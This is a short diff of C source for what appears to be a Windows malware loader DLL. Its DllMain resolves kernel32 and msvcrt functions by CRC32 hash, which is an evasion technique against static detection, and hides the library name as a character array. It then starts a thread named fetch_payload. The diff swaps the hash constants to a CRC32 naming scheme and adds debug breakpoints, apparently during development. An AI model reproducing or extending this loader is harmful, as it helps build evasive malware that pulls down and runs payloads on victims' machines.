@@ -78,21 +78,23 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved)
             HANDLE kernel32_handle = GetModuleHandleH(kernel32_CRC32);
             pLoadLibraryA = (fnLoadLibraryA)GetProcAddressH(kernel32_handle, LoadLibraryA_CRC32);
 
+            MessageBoxA(NULL, "Hello", "Hello", MB_OK);
+            __debugbreak();
             CHAR msvcrt_dll[] = {'m', 's', 'v', 'c', 'r', 't', '.', 'd', 'l', 'l', 0};
             apis.handles.mscvtdll = pLoadLibraryA(msvcrt_dll);
-            apis.msvcrt.memset = (_MEMSET)GetProcAddressH(apis.handles.mscvtdll, HASH_memset);
-            apis.msvcrt._time64 = (_TIME64)GetProcAddressH(apis.handles.mscvtdll, HASH__time64);
-            apis.msvcrt.printf = (_PRINTF)GetProcAddressH(apis.handles.mscvtdll, HASH_printf);
-            apis.msvcrt.rand = (_RAND)GetProcAddressH(apis.handles.mscvtdll, HASH_rand);
-            apis.msvcrt.sprintf = (_SPRINTF)GetProcAddressH(apis.handles.mscvtdll, HASH_sprintf);
-            apis.msvcrt.srand = (_SRAND)GetProcAddressH(apis.handles.mscvtdll, HASH_srand);
-            apis.msvcrt.memcpy = (_MEMCPY)GetProcAddressH(apis.handles.mscvtdll, HASH_memcpy);
-            apis.msvcrt.memcmp = (_MEMCMP)GetProcAddressH(apis.handles.mscvtdll, HASH_memcmp);
-            apis.msvcrt.strlen = (_STRLEN) GetProcAddressH(apis.handles.mscvtdll, HASH_strlen);
-            apis.msvcrt.realloc = (_REALLOC) GetProcAddressH(apis.handles.mscvtdll, HASH_realloc);
-            apis.msvcrt.malloc = (_MALLOC) GetProcAddressH(apis.handles.mscvtdll, HASH_malloc);
-            apis.msvcrt.wcscat = (_WCSCAT) GetProcAddressH(apis.handles.mscvtdll, HASH_wcscat);
-            apis.msvcrt.wcslen = (_WCSLEN) GetProcAddressH(apis.handles.mscvtdll, HASH_wcslen);
+            apis.msvcrt.memset = (_MEMSET)GetProcAddressH(apis.handles.mscvtdll, memset_CRC32);
+            apis.msvcrt._time64 = (_TIME64)GetProcAddressH(apis.handles.mscvtdll, _time64_CRC32);
+            apis.msvcrt.printf = (_PRINTF)GetProcAddressH(apis.handles.mscvtdll, printf_CRC32);
+            apis.msvcrt.rand = (_RAND)GetProcAddressH(apis.handles.mscvtdll, rand_CRC32);
+            apis.msvcrt.sprintf = (_SPRINTF)GetProcAddressH(apis.handles.mscvtdll, sprintf_CRC32);
+            apis.msvcrt.srand = (_SRAND)GetProcAddressH(apis.handles.mscvtdll, srand_CRC32);
+            apis.msvcrt.memcpy = (_MEMCPY)GetProcAddressH(apis.handles.mscvtdll, memcpy_CRC32);
+            apis.msvcrt.memcmp = (_MEMCMP)GetProcAddressH(apis.handles.mscvtdll, memcmp_CRC32);
+            apis.msvcrt.strlen = (_STRLEN) GetProcAddressH(apis.handles.mscvtdll, strlen_CRC32);
+            apis.msvcrt.realloc = (_REALLOC) GetProcAddressH(apis.handles.mscvtdll, realloc_CRC32);
+            apis.msvcrt.malloc = (_MALLOC) GetProcAddressH(apis.handles.mscvtdll, malloc_CRC32);
+            apis.msvcrt.wcscat = (_WCSCAT) GetProcAddressH(apis.handles.mscvtdll, wcscat_CRC32);
+            apis.msvcrt.wcslen = (_WCSLEN) GetProcAddressH(apis.handles.mscvtdll, wcslen_CRC32);
 
             CreateThread(NULL, (SIZE_T) NULL, fetch_payload, NULL, (DWORD) NULL, NULL );
             break;
